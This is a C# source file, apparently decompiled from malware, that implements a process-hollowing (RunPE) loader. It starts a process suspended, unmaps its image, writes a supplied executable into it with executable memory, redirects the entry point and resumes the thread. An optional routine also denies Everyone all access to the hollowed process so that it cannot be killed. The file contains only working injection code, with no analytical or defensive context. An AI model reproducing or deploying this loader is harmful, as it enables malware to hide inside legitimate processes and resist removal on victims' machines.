using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;

public static class GClass0
{
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct Struct0
	{
		public readonly IntPtr ProcessHandle;

		public readonly IntPtr ThreadHandle;

		public readonly uint ProcessId;

		private readonly uint ThreadId;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct Struct1
	{
		public uint Size;

		private readonly string Reserved1;

		private readonly string Desktop;

		private readonly string Title;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
		private readonly byte[] Misc;

		private readonly IntPtr Reserved2;

		private readonly IntPtr StdInput;

		private readonly IntPtr StdOutput;

		private readonly IntPtr StdError;
	}

	private enum Enum0
	{
		DELETE = 65536,
		ITE_OWNER = 524288,
		PROCESS_ALL_ACCESS = 987135,
		PROCESS_CREATE_PROCESS = 128,
		PROCESS_CREATE_THREAD = 2,
		PROCESS_DUP_HANDLE = 64,
		PROCESS_QUERY_INFORMATION = 1024,
		PROCESS_QUERY_LIMITED_INFORMATION = 4096,
		PROCESS_SET_INFORMATION = 512,
		PROCESS_SET_QUOTA = 256,
		PROCESS_SUSPEND_RESUME = 2048,
		PROCESS_TERMINATE = 1,
		PROCESS_VM_OPERATION = 8,
		PROCESS_VM_READ = 16,
		PROCESS_VM_WRITE = 32,
		READ_CONTROL = 131072,
		STANDARD_RIGHTS_REQUIRED = 983040,
		SYNCHRONIZE = 256,
		WRITE_DAC = 262144
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool CreateProcess(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, uint uint_0, IntPtr intptr_2, string string_2, ref Struct1 struct1_0, ref Struct0 struct0_0);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool GetThreadContext(IntPtr intptr_0, int[] int_0);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool Wow64GetThreadContext(IntPtr intptr_0, int[] int_0);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool SetThreadContext(IntPtr intptr_0, int[] int_0);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool Wow64SetThreadContext(IntPtr intptr_0, int[] int_0);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool ReadProcessMemory(IntPtr intptr_0, int int_0, ref int int_1, int int_2, ref int int_3);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool WriteProcessMemory(IntPtr intptr_0, int int_0, byte[] byte_0, int int_1, ref int int_2);

	[DllImport("ntdll.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern int NtUnmapViewOfSection(IntPtr intptr_0, int int_0);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern int VirtualAllocEx(IntPtr intptr_0, int int_0, int int_1, int int_2, int int_3);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern int ResumeThread(IntPtr intptr_0);

	public static bool smethod_0(string string_0, byte[] byte_0, bool bool_0)
	{
		int num = 1;
		while (true)
		{
			if (num <= 5)
			{
				if (smethod_1(string_0, byte_0, bool_0))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static bool smethod_1(string string_0, byte[] byte_0, bool bool_0)
	{
		int int_ = 0;
		string @string = Encoding.UTF8.GetString(Convert.FromBase64String("I2NtZA=="));
		Struct1 struct1_ = default(Struct1);
		Struct0 struct0_ = default(Struct0);
		struct1_.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(Struct1)));
		try
		{
			if (!CreateProcess(string_0, @string, IntPtr.Zero, IntPtr.Zero, bool_0: false, 4u, IntPtr.Zero, null, ref struct1_, ref struct0_))
			{
				throw new Exception();
			}
			int num = BitConverter.ToInt32(byte_0, 60);
			int num2 = BitConverter.ToInt32(byte_0, num + 26 + 26);
			int[] array = new int[179];
			array[0] = 65538;
			if (IntPtr.Size == 4)
			{
				if (!GetThreadContext(struct0_.ThreadHandle, array))
				{
					throw new Exception();
				}
			}
			else if (!Wow64GetThreadContext(struct0_.ThreadHandle, array))
			{
				throw new Exception();
			}
			int num3 = array[41];
			int int_2 = 0;
			if (!ReadProcessMemory(struct0_.ProcessHandle, num3 + 4 + 4, ref int_2, 4, ref int_))
			{
				throw new Exception();
			}
			if (num2 == int_2 && NtUnmapViewOfSection(struct0_.ProcessHandle, int_2) != 0)
			{
				throw new Exception();
			}
			int int_3 = BitConverter.ToInt32(byte_0, num + 80);
			int int_4 = BitConverter.ToInt32(byte_0, num + 42 + 42);
			bool flag = false;
			int num4 = VirtualAllocEx(struct0_.ProcessHandle, num2, int_3, 12288, 64);
			if (num4 == 0)
			{
				throw new Exception();
			}
			if (!WriteProcessMemory(struct0_.ProcessHandle, num4, byte_0, int_4, ref int_))
			{
				throw new Exception();
			}
			int num5 = num + 248;
			short num6 = BitConverter.ToInt16(byte_0, num + 3 + 3);
			for (int i = 0; i < num6; i++)
			{
				int num7 = BitConverter.ToInt32(byte_0, num5 + 6 + 6);
				int num8 = BitConverter.ToInt32(byte_0, num5 + 8 + 8);
				int srcOffset = BitConverter.ToInt32(byte_0, num5 + 20);
				if (num8 != 0)
				{
					byte[] array2 = new byte[num8];
					Buffer.BlockCopy(byte_0, srcOffset, array2, 0, array2.Length);
					if (!WriteProcessMemory(struct0_.ProcessHandle, num4 + num7, array2, array2.Length, ref int_))
					{
						throw new Exception();
					}
				}
				num5 += 40;
			}
			byte[] bytes = BitConverter.GetBytes(num4);
			if (!WriteProcessMemory(struct0_.ProcessHandle, num3 + 8, bytes, 4, ref int_))
			{
				throw new Exception();
			}
			int num9 = BitConverter.ToInt32(byte_0, num + 40);
			if (flag)
			{
				num4 = num2;
			}
			array[44] = num4 + num9;
			if (IntPtr.Size == 4)
			{
				if (!SetThreadContext(struct0_.ThreadHandle, array))
				{
					throw new Exception();
				}
			}
			else if (!Wow64SetThreadContext(struct0_.ThreadHandle, array))
			{
				throw new Exception();
			}
			if (ResumeThread(struct0_.ThreadHandle) == -1)
			{
				throw new Exception();
			}
			if (bool_0)
			{
				smethod_5(struct0_.ProcessHandle);
			}
		}
		catch
		{
			Process processById = Process.GetProcessById(Convert.ToInt32(struct0_.ProcessId));
			processById.Kill();
			return false;
		}
		return true;
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr intptr_0, int int_0, [Out] byte[] byte_0, uint uint_0, ref uint uint_1);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr intptr_0, int int_0, [In] byte[] byte_0);

	private static void smethod_2(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[checked(rawSecurityDescriptor_0.BinaryLength - 1 + 1 - 1 + 1)];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(intptr_0, 4, array))
		{
			throw new Win32Exception();
		}
	}

	private static T smethod_3<T>(ref T gparam_0, T gparam_1)
	{
		gparam_0 = gparam_1;
		return gparam_1;
	}

	private static RawSecurityDescriptor smethod_4(IntPtr intptr_0)
	{
		byte[] gparam_ = new byte[0];
		uint uint_ = 0u;
		GetKernelObjectSecurity(intptr_0, 4, gparam_, 0u, ref uint_);
		if ((long)uint_ > 32767L)
		{
			throw new Win32Exception();
		}
		checked
		{
			if (!GetKernelObjectSecurity(intptr_0, 4, smethod_3(ref gparam_, new byte[(int)(unchecked((ulong)uint_) - 1uL) + 1 - 1 + 1]), uint_, ref uint_))
			{
				throw new Win32Exception();
			}
			return new RawSecurityDescriptor(gparam_, 0);
		}
	}

	private static void smethod_5(IntPtr intptr_0)
	{
		RawSecurityDescriptor rawSecurityDescriptor = smethod_4(intptr_0);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		smethod_2(intptr_0, rawSecurityDescriptor);
	}
}
